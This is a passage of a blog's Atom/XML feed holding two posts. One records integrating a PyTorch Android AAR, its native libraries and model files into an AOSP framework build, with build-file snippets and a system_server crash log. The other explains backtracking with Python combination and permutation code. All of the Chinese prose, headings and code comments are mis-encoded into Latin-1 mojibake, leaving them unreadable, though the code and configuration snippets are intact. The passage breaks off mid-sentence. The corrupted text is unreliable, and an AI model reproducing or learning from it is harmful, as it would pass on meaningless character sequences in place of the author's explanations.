        <content type="html"><![CDATA[<h2 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h2><p>æœ€è¿‘éƒ½åœ¨æè®ºæ–‡ï¼Œéœ€è¦åœ¨androidç³»ç»Ÿä¸Šè·‘æ¨¡å‹ï¼Œæ‰€ä»¥éœ€è¦æŠŠpytorché›†æˆåˆ°androidç³»ç»Ÿå½“ä¸­ã€‚ç®€å•è®°å½•ä¸‹</p><h2 id="æ–¹æ¡ˆ"><a href="#æ–¹æ¡ˆ" class="headerlink" title="æ–¹æ¡ˆ"></a>æ–¹æ¡ˆ</h2><p>æˆ‘æ‰¾äº†å¾ˆå¤šæ–¹æ¡ˆï¼Œå®˜ç½‘è¯´å¯ä»¥è‡ªå·±ç¼–è¯‘pytorchï¼Œä½†æ˜¯ç¯å¢ƒé…ç½®å¾ˆå¤æ‚ã€<a href="https://zhuanlan.zhihu.com/p/650169531%E3%80%91%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%85%B6%E5%AE%9E%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BDaar%E6%96%87%E4%BB%B6">https://zhuanlan.zhihu.com/p/650169531ã€‘ï¼Œå‘ç°å…¶å®å¯ä»¥ç›´æ¥ä¸‹è½½aaræ–‡ä»¶</a><br><a href="https://repo1.maven.org/maven2/org/pytorch/pytorch_android/1.10.0/pytorch_android-1.10.0.aar">https://repo1.maven.org/maven2/org/pytorch/pytorch_android/1.10.0/pytorch_android-1.10.0.aar</a></p><p>åˆšå¼€å§‹å°è¯•ä»aaræ–‡ä»¶å½“ä¸­æå–soæ–‡ä»¶ä»¥åŠå¤´æ–‡ä»¶ï¼Œé›†æˆè¿›Adnroidé‡Œé¢<br>å‚è€ƒäº†è¿™äº›åšå®¢ï¼š<a href="https://blog.csdn.net/zuguorui/article/details/96464821">https://blog.csdn.net/zuguorui/article/details/96464821</a> å‘ç°ä¹Ÿæ˜¯ä¸è¡Œï¼Œå…·ä½“åŸå› å¿˜è®°äº†</p><p>æ¥ä¸‹æ¥ç›´æ¥ä»å®˜ç½‘ä¸‹è½½çš„pytorchaaræ–‡ä»¶ï¼Œåˆ†æä¸‹æ¥è¿™ä¸ªæ–¹æ¡ˆå¯è¡Œçš„åŸå› ä¸»è¦æ˜¯æˆ‘æ˜¯åœ¨framworkå±‚ï¼Œæœ¬èº«æ˜¯å¯ä»¥é›†æˆjavaç¯å¢ƒçš„ï¼Œç›´æ¥åœ¨javaå±‚è°ƒç”¨pytorchçš„api</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><p>å‚è€ƒäº†è¿™ç¯‡åšå®¢ï¼ŒåŸºæœ¬æ­¥éª¤æ˜¯ä¸€æ ·çš„ï¼š<a href="https://blog.csdn.net/DKBDKBDKB/article/details/104153094%EF%BC%8C%E4%BD%86%E8%BF%99%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%87%8C%E9%9D%A2%E7%BC%BA%E4%BA%86%E7%82%B9%E4%B8%9C%E8%A5%BF">https://blog.csdn.net/DKBDKBDKB/article/details/104153094ï¼Œä½†è¿™ä¸ªåšå®¢é‡Œé¢ç¼ºäº†ç‚¹ä¸œè¥¿</a></p><ol><li>åœ¨framworks&#x2F;baseä¸‹æ–°å»ºä¸€ä¸ªç›®å½•ï¼Œä¾‹å¦‚ï¼špytorchï¼Œå°†aaræ–‡ä»¶æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œå¹¶æ–°å»ºä¸€ä¸ªæ–‡ä»¶ Adnroid.bp ä¿®æ”¹å…¶ä¸­å†…å®¹å¦‚ä¸‹<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">android_library_import &#123;</span><br><span class="line">    name: &quot;services.pytorch&quot;,</span><br><span class="line">    aars: [&quot;pytorch_android-1.10.0.aar&quot;],</span><br><span class="line">    sdk_version: &quot;current&quot;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>ä¹‹ååœ¨baseç›®å½•ä¸‹çš„Android.bpæ–‡ä»¶é‡Œçš„java_libraryå½“ä¸­çš„static_libsæ·»åŠ ä¸€è¡Œ<code>&quot;services.pytorch&quot;,</code>ï¼Œè¿™æ ·å°±å®Œæˆä¸€å¤§åŠäº†</li></ol><p>ä¹‹åæˆ‘ç¼–è¯‘å´å‘ç°ä¸è¡Œã€‚ã€‚ã€‚ å°è¯•äº†å¾ˆå¤šæ¬¡</p><p>å¥¥å¯¹äº† æˆ‘è¿˜åœ¨ä»£ç å½“ä¸­å¼•ç”¨äº†pytorch</p><p>ä¹‹åä½¿ç”¨åœ¨ç¼–è¯‘ç³»ç»Ÿæ—¶ä½¿ç”¨make clean<br>æŠ¥é”™ä¸è¢«å…è®¸ï¼Œå‚è€ƒä¸‹é¢çš„å†…å®¹ä¿®æ”¹ build&#x2F;soong&#x2F;scripts&#x2F;check_boot_jars&#x2F;package_allowed_list.txt<br><a href="https://stackoverflow.com/questions/77813438/add-an-external-aar-library-to-aosp-for-internal-use-from-java-in-frameworks-bas">https://stackoverflow.com/questions/77813438/add-an-external-aar-library-to-aosp-for-internal-use-from-java-in-frameworks-bas</a></p><p>æ·»åŠ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org\.torch</span><br><span class="line">org\.torch\..*</span><br></pre></td></tr></table></figure><p>è§£å†³æŠ¥é”™</p><h2 id="ä½¿ç”¨pytorch"><a href="#ä½¿ç”¨pytorch" class="headerlink" title="ä½¿ç”¨pytorch"></a>ä½¿ç”¨pytorch</h2><p>æˆ‘å†™äº†ä»£ç ä½¿ç”¨äº†ä¸Šé¢çš„pytorch ä»£ç é¦–å…ˆæˆ‘åœ¨åº”ç”¨å±‚appé‡Œé¢è¿è¡Œäº†æ²¡æœ‰é—®é¢˜æ‰ç”¨çš„<br>åˆ°ç³»ç»Ÿé‡Œå°è£…äº†ç±» åˆå‡ºç°äº†æŠ¥é”™ è¿™æ¬¡æ˜¯ç›´æ¥è¿›å…¥å¾ªç¯å¼€æœº èƒ½å¤Ÿå¼€å¼€è¯´æ˜å†…æ ¸ä»€ä¹ˆçš„æ²¡é—®é¢˜<br>å°±æ˜¯æˆ‘åœ¨framworkåŠ çš„ä»£ç å‡ºé—®é¢˜äº†</p><p>åˆšå¼€å§‹å‘ç°adbå¹¶ä¸èƒ½ç”¨,ä½†æ˜¯æˆ‘å°è¯•äº†adb devices<br>å¯ä»¥è¯†åˆ«åˆ°æ‰‹æœº ä½†æ˜¯æœªæˆæƒ æ‰¾äº†ä¸‹èµ„æ–™ å¯ä»¥åœ¨ç³»ç»Ÿä¸­è®¾ç½®è‡ªåŠ¨å¼€å¯adbè°ƒè¯•<br><a href="https://bbs.kanxue.com/thread-281293.htm">https://bbs.kanxue.com/thread-281293.htm</a><br>è§£å†³é—®é¢˜,è§‚å¯Ÿåˆ°å¦‚ä¸‹æŠ¥é”™,æœç„¶æ˜¯ä»£ç é—®é¢˜,å¤ªä¸ç†Ÿæ‚‰äº†,é‡æ„ä¸‹ä»£ç ç¼–è¯‘è¿è¡Œä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Exception dispatching input event.</span><br><span class="line">2024-12-17 17:37:22.776  7496-7496  Zygote                  system_process                       E  System zygote died with fatal exception</span><br><span class="line">                                                                                                    java.lang.NullPointerException: Attempt to invoke virtual method &#x27;float[][] android.hardware.SystemSensorManager$TensorProcessingTool.processSensorData(float[][])&#x27; on a null object reference</span><br><span class="line">                                                                                                    at android.hardware.SystemSensorManager$SensorEventQueue.dispatchSensorEvent(SystemSensorManager.java:1104)</span><br><span class="line">                                                                                                    at android.os.MessageQueue.nativePollOnce(Native Method)</span><br><span class="line">                                                                                                    at android.os.MessageQueue.next(MessageQueue.java:335)</span><br><span class="line">                                                                                                    at android.os.Looper.loopOnce(Looper.java:161)</span><br><span class="line">                                                                                                    at android.os.Looper.loop(Looper.java:288)</span><br><span class="line">                                                                                                    at com.android.server.SystemServer.run(SystemServer.java:903)</span><br><span class="line">                                                                                                    at com.android.server.SystemServer.main(SystemServer.java:610)</span><br><span class="line">                                                                                                    at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">                                                                                                    at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)</span><br><span class="line">                                                                                                    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:981)</span><br><span class="line">2024-12-17 17:37:22.776  7496-7496  AndroidRuntime          system_process                       D  Shutting down VM</span><br><span class="line">2024-12-17 17:37:22.776  7496-7496  AndroidRuntime          system_process                       E  *** FATAL EXCEPTION IN SYSTEM PROCESS: main</span><br><span class="line">                                                                                                    java.lang.NullPointerException: Attempt to invoke virtual method &#x27;float[][] android.hardware.SystemSensorManager$TensorProcessingTool.processSensorData(float[][])&#x27; on a null object reference</span><br><span class="line">                                                                                                    at android.hardware.SystemSensorManager$SensorEventQueue.dispatchSensorEvent(SystemSensorManager.java:1104)</span><br><span class="line">                                                                                                    at android.os.MessageQueue.nativePollOnce(Native Method)</span><br><span class="line">                                                                                                    at android.os.MessageQueue.next(MessageQueue.java:335)</span><br><span class="line">                                                                                                    at android.os.Looper.loopOnce(Looper.java:161)</span><br><span class="line">                                                                                                    at android.os.Looper.loop(Looper.java:288)</span><br><span class="line">                                                                                                    at com.android.server.SystemServer.run(SystemServer.java:903)</span><br><span class="line">                                                                                                    at com.android.server.SystemServer.main(SystemServer.java:610)</span><br><span class="line">                                                                                                    at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">                                                                                                    at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)</span><br><span class="line">                                                                                                    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:981)</span><br></pre></td></tr></table></figure><h2 id="æ­£è§£æ¥äº†"><a href="#æ­£è§£æ¥äº†" class="headerlink" title="æ­£è§£æ¥äº†!"></a>æ­£è§£æ¥äº†!</h2><p>æˆ‘å°è¯•äº†å¥½ä¹…éƒ½æ²¡æœ‰æˆåŠŸ,å‘ç°aarå¦‚æœå¸¦æœ‰soçš„è¯åº”è¯¥æ˜¯ä¸èƒ½æ­£å¸¸åŠ è½½ï¼Œæ‰€ä»¥æˆ‘å°±å°è¯•äº†æŠŠaaræ–‡ä»¶é‡Œé¢çš„javaä»£ç å’Œsoåˆ†åˆ«è¿›è¡Œç¼–è¯‘<br>ä¸»è¦æ­¥éª¤å¯ä»¥æ€»ç»“ä¸ºä¸‹é¢çš„</p><ol><li>å¯¹åº”jarè½¬æºç ï¼Œç§»é™¤ä¸å¿…è¦ä¾èµ–ã€‚</li><li>æ–‡ä»¶å¤¹å¤åˆ¶è·¯å¾„ frameworks&#x2F;base&#x2F;core&#x2F;java</li><li>ä¿®æ”¹Android framework ç¼–è¯‘æƒé™æ–‡ä»¶  æ—§ç‰ˆæœ¬æ›´æ–°update.api,build&#x2F;soong&#x2F;scripts&#x2F;check_boot_jars&#x2F;package_allowed_list.txt è¿™éƒ¨åˆ†å…¶å®ç¬¬ä¸€æ¬¡å°±é‡åˆ°è¿‡</li><li>ç¼–è¯‘æºç  æ·»åŠ so ï¼Œptæ¨¡å‹æ–‡ä»¶çš„ç¼–è¯‘ã€‚åœ¨é¡¹ç›®device.mk æ–‡ä»¶ä¸­æ·»åŠ ç¼–è¯‘å‘½ä»¤å³å¯ã€‚ ä½†è¿™æ—¶å€™ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ç½‘ä¸Šæœç´¢å°±å¥½ å¥½åƒæ˜¯å› ä¸ºandroidç‰ˆæœ¬æ¯”è¾ƒé«˜æ‰€ä»¥æ·»åŠ äº†é™åˆ¶ ä¸è®©ç¼–è¯‘so ä¿®æ”¹ä¸€ä¸ªé…ç½®å°±å¥½äº†</li></ol><p>ç¼–è¯‘æ·»åŠ å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PRODUCT_COPY_FILES += \   </span><br><span class="line">$(LOCAL_PATH)/pytorch/lib/libc++_shared.so:$(TARGET_COPY_OUT_SYSTEM)/lib/libc++_shared.so \  $(LOCAL_PATH)/pytorch/lib64/libc++_shared.so:$(TARGET_COPY_OUT_SYSTEM)/lib64/libc++_shared.so  \</span><br><span class="line">$(LOCAL_PATH)/pytorch/lib/libfbjni.so:$(TARGET_COPY_OUT_SYSTEM)/lib/libfbjni.so \   $(LOCAL_PATH)/pytorch/lib/libpytorch_jni_lite.so:$(TARGET_COPY_OUT_SYSTEM)/lib/libpytorch_jni_lite.so \</span><br><span class="line">$(LOCAL_PATH)/pytorch/lib64/libfbjni.so:$(TARGET_COPY_OUT_SYSTEM)/lib64/libfbjni.so \  $(LOCAL_PATH)/pytorch/lib64/libpytorch_jni_lite.so:$(TARGET_COPY_OUT_SYSTEM)/lib64/libpytorch_jni_lite.so \   $(LOCAL_PATH)/pytorch/cvae1_mobile.pt:$(TARGET_COPY_OUT_SYSTEM)/etc/cvae1_mobile.pt \  $(LOCAL_PATH)/pytorch/DenoiseNet_mobile.pt:$(TARGET_COPY_OUT_SYSTEM)/etc/DenoiseNet_mobile.pt </span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/xjh24778451/article/details/127556958">https://blog.csdn.net/xjh24778451/article/details/127556958</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘å›æº¯ç®—æ³•</title>
      <link href="/2024/11/29/algorithm/backtracking/"/>
      <url>/2024/11/29/algorithm/backtracking/</url>
      
        <content type="html"><![CDATA[<h2 id="å›æº¯æ³•æ¦‚å†µ"><a href="#å›æº¯æ³•æ¦‚å†µ" class="headerlink" title="å›æº¯æ³•æ¦‚å†µ"></a>å›æº¯æ³•æ¦‚å†µ</h2><p>å›æº¯æ³•ï¼Œä¸€èˆ¬å¯ä»¥è§£å†³å¦‚ä¸‹å‡ ç§é—®é¢˜ï¼š</p><ul><li>ç»„åˆé—®é¢˜ï¼šNä¸ªæ•°é‡Œé¢æŒ‰ä¸€å®šè§„åˆ™æ‰¾å‡ºkä¸ªæ•°çš„é›†åˆ</li><li>åˆ‡å‰²é—®é¢˜ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æŒ‰ä¸€å®šè§„åˆ™æœ‰å‡ ç§åˆ‡å‰²æ–¹å¼</li><li>å­é›†é—®é¢˜ï¼šä¸€ä¸ªNä¸ªæ•°çš„é›†åˆé‡Œæœ‰å¤šå°‘ç¬¦åˆæ¡ä»¶çš„å­é›†</li><li>æ’åˆ—é—®é¢˜ï¼šNä¸ªæ•°æŒ‰ä¸€å®šè§„åˆ™å…¨æ’åˆ—ï¼Œæœ‰å‡ ç§æ’åˆ—æ–¹å¼</li><li>æ£‹ç›˜é—®é¢˜ï¼šNçš‡åï¼Œè§£æ•°ç‹¬ç­‰ç­‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void backtracking(å‚æ•°) &#123;</span><br><span class="line">    if (ç»ˆæ­¢æ¡ä»¶) &#123;</span><br><span class="line">        å­˜æ”¾ç»“æœ;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (é€‰æ‹©ï¼šæœ¬å±‚é›†åˆä¸­å…ƒç´ ï¼ˆæ ‘ä¸­èŠ‚ç‚¹å­©å­çš„æ•°é‡å°±æ˜¯é›†åˆçš„å¤§å°ï¼‰) &#123;</span><br><span class="line">        å¤„ç†èŠ‚ç‚¹;</span><br><span class="line">        backtracking(è·¯å¾„ï¼Œé€‰æ‹©åˆ—è¡¨); // é€’å½’</span><br><span class="line">        å›æº¯ï¼Œæ’¤é”€å¤„ç†ç»“æœ</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="startIndex-åœ¨å›æº¯ä¸­çš„ä½œç”¨ä¸ç”¨æ³•"><a href="#startIndex-åœ¨å›æº¯ä¸­çš„ä½œç”¨ä¸ç”¨æ³•" class="headerlink" title="startIndex åœ¨å›æº¯ä¸­çš„ä½œç”¨ä¸ç”¨æ³•"></a><strong><code>startIndex</code> åœ¨å›æº¯ä¸­çš„ä½œç”¨ä¸ç”¨æ³•</strong></h2><p>åœ¨ <strong>å›æº¯ï¼ˆBacktrackingï¼‰</strong> ç›¸å…³çš„ç®—æ³•ï¼ˆå¦‚ <strong>å­é›†ã€ç»„åˆã€æ’åˆ—ã€åˆ†å‰²é—®é¢˜</strong>ï¼‰ä¸­ï¼Œ<code>startIndex</code> çš„ä½œç”¨éå¸¸é‡è¦ï¼Œå®ƒå†³å®šäº†é€’å½’æœç´¢çš„èŒƒå›´ï¼Œå½±å“ <strong>æ˜¯å¦å…è®¸é‡å¤å…ƒç´ </strong> ä»¥åŠ <strong>æ˜¯å¦éœ€è¦å‰ªæ</strong>ã€‚</p><h3 id="1-startIndex-ä½œç”¨"><a href="#1-startIndex-ä½œç”¨" class="headerlink" title="1. startIndex ä½œç”¨"></a><strong>1. <code>startIndex</code> ä½œç”¨</strong></h3><h3 id="1-æ§åˆ¶æœç´¢èŒƒå›´ï¼Œé¿å…é‡å¤"><a href="#1-æ§åˆ¶æœç´¢èŒƒå›´ï¼Œé¿å…é‡å¤" class="headerlink" title="(1) æ§åˆ¶æœç´¢èŒƒå›´ï¼Œé¿å…é‡å¤"></a><strong>(1) æ§åˆ¶æœç´¢èŒƒå›´ï¼Œé¿å…é‡å¤</strong></h3><ul><li><code>startIndex</code> ç¡®ä¿æœç´¢ä»å½“å‰ç´¢å¼•æˆ–åé¢çš„å…ƒç´ å¼€å§‹ï¼Œ<strong>é˜²æ­¢å›æº¯æ—¶é‡å¤é€‰æ‹©ä¹‹å‰å·²ç»é€‰æ‹©è¿‡çš„å…ƒç´ </strong>ã€‚</li><li><strong>é€‚ç”¨äºå­é›†ã€ç»„åˆé—®é¢˜</strong>ï¼Œä½† <strong>ä¸é€‚ç”¨äºæ’åˆ—é—®é¢˜</strong>ï¼ˆæ’åˆ—é—®é¢˜å…è®¸å…ƒç´ äº¤æ¢é¡ºåºï¼‰ã€‚</li></ul><h4 id="2-é€’å½’å±‚æ¬¡æ¨è¿›"><a href="#2-é€’å½’å±‚æ¬¡æ¨è¿›" class="headerlink" title="(2) é€’å½’å±‚æ¬¡æ¨è¿›"></a><strong>(2) é€’å½’å±‚æ¬¡æ¨è¿›</strong></h4><ul><li>é€’å½’è¿›å…¥ä¸‹ä¸€å±‚æ—¶ï¼Œ<code>startIndex</code> å¢åŠ ï¼Œç¡®ä¿æœç´¢ä¸å›å¤´ï¼Œ<strong>ä¿è¯ç»„åˆçš„å”¯ä¸€æ€§</strong>ã€‚</li><li><code>startIndex</code> çš„å€¼é€šå¸¸æ˜¯ <code>i + 1</code>ï¼Œè¡¨ç¤ºå½“å‰å…ƒç´  <code>nums[i]</code> é€‰ä¸­åï¼Œä¸‹æ¬¡ä» <code>i+1</code> ä½ç½®å¼€å§‹æœç´¢ã€‚</li></ul><hr><h3 id="2-startIndex-åœ¨ä¸åŒå›æº¯é—®é¢˜ä¸­çš„ä½¿ç”¨"><a href="#2-startIndex-åœ¨ä¸åŒå›æº¯é—®é¢˜ä¸­çš„ä½¿ç”¨" class="headerlink" title="2. startIndex åœ¨ä¸åŒå›æº¯é—®é¢˜ä¸­çš„ä½¿ç”¨"></a><strong>2. <code>startIndex</code> åœ¨ä¸åŒå›æº¯é—®é¢˜ä¸­çš„ä½¿ç”¨</strong></h3><h4 id="1-ç»„åˆé—®é¢˜ï¼ˆstartIndex-éœ€è¦ï¼‰"><a href="#1-ç»„åˆé—®é¢˜ï¼ˆstartIndex-éœ€è¦ï¼‰" class="headerlink" title="(1) ç»„åˆé—®é¢˜ï¼ˆstartIndex éœ€è¦ï¼‰"></a><strong>(1) ç»„åˆé—®é¢˜ï¼ˆ<code>startIndex</code> éœ€è¦ï¼‰</strong></h4><p><strong>é—®é¢˜ï¼šä» <code>[1,2,3]</code> ä¸­é€‰å‡ºé•¿åº¦ä¸º 2 çš„ç»„åˆ</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">combine</span>(<span class="params">self, nums, k</span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, k, <span class="number">0</span>, [], result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, k, startIndex, path, result</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(path) == k:</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(nums)):  <span class="comment"># å…³é”®ï¼šä» startIndex å¼€å§‹</span></span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, k, i + <span class="number">1</span>, path, result)  <span class="comment"># é€’å½’ï¼Œi+1 é¿å…é‡å¤é€‰æ‹©</span></span><br><span class="line">            path.pop()  <span class="comment"># å›æº¯</span></span><br><span class="line"></span><br><span class="line">sol = Solution()</span><br><span class="line"><span class="built_in">print</span>(sol.combine([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h4 id="ğŸ“Œ-startIndex-çš„ä½œç”¨"><a href="#ğŸ“Œ-startIndex-çš„ä½œç”¨" class="headerlink" title="ğŸ“Œ startIndex çš„ä½œç”¨"></a><strong>ğŸ“Œ <code>startIndex</code> çš„ä½œç”¨</strong></h4><ul><li><strong>é¿å…é‡å¤é€‰æ‹©</strong>ï¼š<ul><li><code>startIndex</code> è®©æœç´¢ä» <code>i+1</code> ä½ç½®å¼€å§‹ï¼Œä¿è¯ç»„åˆä¸­çš„å…ƒç´ ä¸é‡å¤ä½¿ç”¨ã€‚</li></ul></li><li><strong>è¾“å‡ºç»“æœ</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">1</span>,<span class="number">3</span>], [<span class="number">2</span>,<span class="number">3</span>]]</span><br></pre></td></tr></table></figure><ul><li>**ä¸ä¼šå‡ºç° <code>[2,1]</code> æˆ– <code>[3,1]</code>**ï¼Œå› ä¸º <code>startIndex</code> æ§åˆ¶äº†æœç´¢æ–¹å‘ï¼Œç¡®ä¿å…ƒç´ ä¸ä¼šå‘å‰é€‰æ‹©ã€‚</li></ul></li></ul><hr><h4 id="2-æ’åˆ—é—®é¢˜ï¼ˆstartIndex-ä¸éœ€è¦ï¼‰"><a href="#2-æ’åˆ—é—®é¢˜ï¼ˆstartIndex-ä¸éœ€è¦ï¼‰" class="headerlink" title="(2) æ’åˆ—é—®é¢˜ï¼ˆstartIndex ä¸éœ€è¦ï¼‰"></a><strong>(2) æ’åˆ—é—®é¢˜ï¼ˆ<code>startIndex</code> ä¸éœ€è¦ï¼‰</strong></h4><p><strong>é—®é¢˜ï¼šä» <code>[1,2,3]</code> ä¸­é€‰å‡ºæ‰€æœ‰æ’åˆ—</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums</span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, [], result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, path, result</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(path) == <span class="built_in">len</span>(nums):</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):  <span class="comment"># å…³é”®ï¼šä¸ä½¿ç”¨ startIndex</span></span><br><span class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> path:  <span class="comment"># ä¸èƒ½é‡å¤ä½¿ç”¨å…ƒç´ </span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, path, result)  <span class="comment"># é€’å½’ï¼Œæ²¡æœ‰ startIndex</span></span><br><span class="line">            path.pop()  <span class="comment"># å›æº¯</span></span><br><span class="line"></span><br><span class="line">sol = Solution()</span><br><span class="line"><span class="built_in">print</span>(sol.permute([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))</span><br></pre></td></tr></table></figure><h4 id="ğŸ“Œ-ä¸ºä»€ä¹ˆä¸ç”¨-startIndex"><a href="#ğŸ“Œ-ä¸ºä»€ä¹ˆä¸ç”¨-startIndex" class="headerlink" title="ğŸ“Œ ä¸ºä»€ä¹ˆä¸ç”¨ startIndex"></a><strong>ğŸ“Œ ä¸ºä»€ä¹ˆä¸ç”¨ <code>startIndex</code></strong></h4><ul><li><p><strong>æ’åˆ—é—®é¢˜å…è®¸å…ƒç´ äº¤æ¢é¡ºåº</strong>ï¼Œæ‰€ä»¥ä¸éœ€è¦ <code>startIndex</code> æ¥é™åˆ¶æœç´¢æ–¹å‘ã€‚</p></li><li><p>ä½†ä»ç„¶éœ€è¦ <code>if nums[i] in path:</code> è¿™ä¸ªæ¡ä»¶ï¼Œ<strong>é¿å…é‡å¤é€‰æ‹©ç›¸åŒå…ƒç´ </strong>ã€‚</p></li><li><p><strong>è¾“å‡ºç»“æœ</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>], [<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>], [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>], [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]]</span><br></pre></td></tr></table></figure><ul><li>è¿™é‡Œ <code>2,1</code> ä¹Ÿå‡ºç°äº†ï¼Œè¯´æ˜ <code>startIndex</code> æ²¡æœ‰é™åˆ¶æ’åˆ—é¡ºåºã€‚</li></ul></li></ul><hr><h4 id="3-å­é›†é—®é¢˜ï¼ˆstartIndex-æ§åˆ¶å”¯ä¸€æ€§ï¼‰"><a href="#3-å­é›†é—®é¢˜ï¼ˆstartIndex-æ§åˆ¶å”¯ä¸€æ€§ï¼‰" class="headerlink" title="(3) å­é›†é—®é¢˜ï¼ˆstartIndex æ§åˆ¶å”¯ä¸€æ€§ï¼‰"></a><strong>(3) å­é›†é—®é¢˜ï¼ˆ<code>startIndex</code> æ§åˆ¶å”¯ä¸€æ€§ï¼‰</strong></h4><p><strong>é—®é¢˜ï¼šæ±‚ 